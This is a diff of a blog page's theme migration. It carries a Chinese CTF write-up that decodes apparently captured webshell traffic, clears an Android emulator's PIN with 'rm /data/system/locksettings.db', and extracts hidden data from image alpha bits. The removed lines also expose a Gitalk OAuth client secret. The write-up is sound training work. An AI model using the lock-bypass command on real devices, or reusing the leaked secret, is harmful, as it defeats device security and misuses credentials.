&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$pass=&#x27;air123&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;d8ea7326e6ec5916&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;J+5pNzMyNmU2mij7dMD/qHMAa1dTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdeYr09l6fxhLPMsLeAwg8MkGmC+Nbz1+kYvogF0EFH1p/KFEzIcNBVfDaa946G+ynGJob9hH1+WlZFwyP79y4/cvxxKNVw8xP1OZWE3&#x27;</span>;</span><br><span class="line"><span class="comment">//$b = substr($a, 16, strlen($a) - 32);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gzdecode</span>(<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$a</span>), <span class="variable">$key</span>));</span><br></pre></td></tr></table></figure>
 
-<p>然后我们直接看比较靠后的包，终于在我们的36流, 发现了密码<code>airDAS1231qaSW@</code><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302262204907.png" alt="image-20230226220408809"></p>
-<p>最终拿到flag<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302262205158.png" alt="image-20230226220503128"></p>
+<p>然后我们直接看比较靠后的包，终于在我们的36流, 发现了密码<code>airDAS1231qaSW@</code><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302262204907.png"
+                      alt="image-20230226220408809"
+                ></p>
+<p>最终拿到flag<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302262205158.png"
+                      alt="image-20230226220503128"
+                ></p>
 <h3 id="机你太美"><a href="#机你太美" class="headerlink" title="机你太美"></a>机你太美</h3><p>下载下来是一个<code>npbk</code>文件, npbk可以当作一个压缩包然后直接分析他里边的<code>vmdk</code>, 直接修改后缀为<code>zip</code>, 解压拿到vmdk, npbk也提示我们这是个安卓系统, 我们可以直接将其导入模拟器, 这里我用的是夜神, 其他的应该也是可以的</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181456238.png" alt="image-20230318145652128"></p>
-<p>然后我们开启这台机器, 发现有密码<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181457632.png" alt="image-20230318145722541"></p>
-<p>大部分人参考的都是<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xinmomoyan/p/14791367.html">这篇文章</a></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181456238.png"
+                      alt="image-20230318145652128"
+                ></p>
+<p>然后我们开启这台机器, 发现有密码<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181457632.png"
+                      alt="image-20230318145722541"
+                ></p>
+<p>大部分人参考的都是<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/xinmomoyan/p/14791367.html" >这篇文章<i class="fas fa-external-link-alt"></i></a></p>
 <p>我们可以借用<code>nox</code>自带的adb shell</p>
 <p>这里开启虚拟机, 然后直接终端打开到<code>Nox/bin</code>目录即可</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181459781.png" alt="image-20230318145955451"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181459781.png"
+                      alt="image-20230318145955451"
+                ></p>
 <p>然后直接执行</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> /data/system/locksettings.db</span><br></pre></td></tr></table></figure>
 
 <p>即可清楚pin码</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181506719.png" alt="image-20230318150627448"></p>
-<p>看起来一切正常, 只有一个Skred貌似可以利用<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181523862.png" alt="image-20230318152348750"></p>
-<p>这里是两个人的聊天记录, 一堆压缩包以及两张图片<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181526039.png" alt="image-20230318152630986"></p>
-<p>我们可以从这里将图片保存出来到pc上<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181530698.png" alt="image-20230318153049601"></p>
-<p>二话不说, zsteg跑一下试试, 看的我头皮发麻, 也没看出有什么猫腻<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181551010.png" alt="image-20230318155127875"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181506719.png"
+                      alt="image-20230318150627448"
+                ></p>
+<p>看起来一切正常, 只有一个Skred貌似可以利用<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181523862.png"
+                      alt="image-20230318152348750"
+                ></p>
+<p>这里是两个人的聊天记录, 一堆压缩包以及两张图片<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181526039.png"
+                      alt="image-20230318152630986"
+                ></p>
+<p>我们可以从这里将图片保存出来到pc上<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181530698.png"
+                      alt="image-20230318153049601"
+                ></p>
+<p>二话不说, zsteg跑一下试试, 看的我头皮发麻, 也没看出有什么猫腻<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181551010.png"
+                      alt="image-20230318155127875"
+                ></p>
 <p>再打开<code>stegsolve</code>这个软件也许会更直观一点, alpha2很明显有东西, 直接提出来看看</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181553397.png" alt="image-20230318155314331"></p>
-<p>保存出来会发现一些不一样的地方, 这里一定要细心一点, 因为文件非常大<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181600471.png" alt="image-20230318160036408"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181553397.png"
+                      alt="image-20230318155314331"
+                ></p>
+<p>保存出来会发现一些不一样的地方, 这里一定要细心一点, 因为文件非常大<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181600471.png"
+                      alt="image-20230318160036408"
+                ></p>
 <p>这里可以写个脚本将数据二进制提取出来</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;1.png&#x27;</span>)</span><br><span class="line">a, b = img.size</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(b):</span><br><span class="line">        pixel = img.getpixel((x, y))</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">400</span>:</span><br><span class="line">            r, g, b, alpha = pixel</span><br><span class="line">            <span class="keyword">if</span> alpha == <span class="number">251</span>:</span><br><span class="line">                flag += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> alpha == <span class="number">255</span>:</span><br><span class="line">                flag += <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181647312.png" alt="image-20230318164750192"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181647312.png"
+                      alt="image-20230318164750192"
+                ></p>
 <p>可以拿到字符串<code>e01544a9333ef62a3aa27357eb52ea8a</code></p>
-<p>像压缩包密码可以解压<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181652500.png" alt="image-20230318165200446"></p>
-<p>这里还有一张图片没有用到, 它的信息居然藏在了exif里可以使用<a target="_blank" rel="noopener" href="https://www.gaitubao.com/exif">在线工具</a>查看</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181652887.png" alt="image-20230318165244816"></p>
-<p>直接来xor可以拿到flag<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181654809.png" alt="image-20230318165407734"></p>
+<p>像压缩包密码可以解压<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181652500.png"
+                      alt="image-20230318165200446"
+                ></p>
+<p>这里还有一张图片没有用到, 它的信息居然藏在了exif里可以使用<a class="link"   target="_blank" rel="noopener" href="https://www.gaitubao.com/exif" >在线工具<i class="fas fa-external-link-alt"></i></a>查看</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181652887.png"
+                      alt="image-20230318165244816"
+                ></p>
+<p>直接来xor可以拿到flag<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303181654809.png"
+                      alt="image-20230318165407734"
+                ></p>
 
-            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
-            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
-                <source type="audio/mpeg" src="">
-            </audio>
+            </div>
+
             
-                <ul id="audio-list" style="display:none">
+
+            
+                <ul class="post-tags-box">
                     
-                        
-                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
-                        
+                        <li class="tag-item">
+                            <a href="/tags/Misc/">#Misc</a>&nbsp;
+                        </li>
                     
-                        
-                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
-                        
+                        <li class="tag-item">
+                            <a href="/tags/reaction/">#reaction</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Wp/">#Wp</a>&nbsp;
+                        </li>
                     
                 </ul>
             
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2023/03/08/Python_Selenium%E5%AD%A6%E4%B9%A0/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">Python_Selenium_Study</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/02/19/web_8_tp/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Web_8_thinkphp专题</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;Comments
+    </div>
+    
+        
+            
+
+    <div class="waline-comment-container">
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"/>
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline-meta.css"/>
+        <script data-pjax src="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.js"></script>
+        <div id="waline-comment"></div>
+        <script data-pjax>
+          function loadWaline() {
+            Waline.init({
+              el: '#waline-comment',
+              serverURL: 'https://lsvf4zhg.api.lncldglobal.com',
+              lang: 'en' || 'zh-CN',
+              comment: '.post-comments-count',
+              reaction: 'true' === 'true'
+            })
+          }
+
+          if ('true' === 'true') {
+            setTimeout(() => {
+              loadWaline()
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadWaline)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#MP3"><span class="nav-text">MP3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#take-the-zip-easy"><span class="nav-text">take_the_zip_easy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%BA%E4%BD%A0%E5%A4%AA%E7%BE%8E"><span class="nav-text">机你太美</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2022.04.28</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Charmersix</a>
+            
         </div>
         
-    <div id="gitalk-container" class="comment link"
-		data-enable="true"
-        data-ae="false"
-        data-ci="f71ceda7a670da0dc3de"
-        data-cs="8be3f3262b0ceccee081194200fa10dca1224f03"
-        data-r="blog_comments"
-        data-o="Charmersix"
-        data-a="Charmersix"
-        data-d="false"
-    >查看评论</div>
-
-
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
     </div>
+</footer>
+
+        </div>
+    </div>
+
     
-        <div class="side">
-			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#MP3"><span class="toc-number">1.</span> <span class="toc-text">MP3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#take-the-zip-easy"><span class="toc-number">2.</span> <span class="toc-text">take_the_zip_easy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%BA%E4%BD%A0%E5%A4%AA%E7%BE%8E"><span class="toc-number">3.</span> <span class="toc-text">机你太美</span></a></li></ol>	
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
         </div>
     
-</div>
 
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
 
     </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
 </div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
 </body>
-
-<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
-
-
-<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
-<script src="/js/plugin.js"></script>
-<script src="/js/typed.js"></script>
-<script src="/js/diaspora.js"></script>
-
-
-<link rel="stylesheet" href="/photoswipe/photoswipe.css">
-<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
-
-
-<script src="/photoswipe/photoswipe.min.js"></script>
-<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
-
-
-<!-- Root element of PhotoSwipe. Must have class pswp. -->
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-    <!-- Background of PhotoSwipe. 
-         It's a separate element as animating opacity is faster than rgba(). -->
-    <div class="pswp__bg"></div>
-    <!-- Slides wrapper with overflow:hidden. -->
-    <div class="pswp__scroll-wrap">
-        <!-- Container that holds slides. 
-            PhotoSwipe keeps only 3 of them in the DOM to save memory.
-            Don't modify these 3 pswp__item elements, data is added later on. -->
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
-        <div class="pswp__ui pswp__ui--hidden">
-            <div class="pswp__top-bar">
-                <!--  Controls are self-explanatory. Order can be changed. -->
-                <div class="pswp__counter"></div>
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
-                <!-- element will get class pswp__preloader--active when preloader is running -->
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                      <div class="pswp__preloader__cut">
-                        <div class="pswp__preloader__donut"></div>
-                      </div>
-                    </div>
-                </div>
-            </div>
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div> 
-            </div>
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-        </div>
-    </div>
-</div>
-
-
-
-
-
-
 </html>
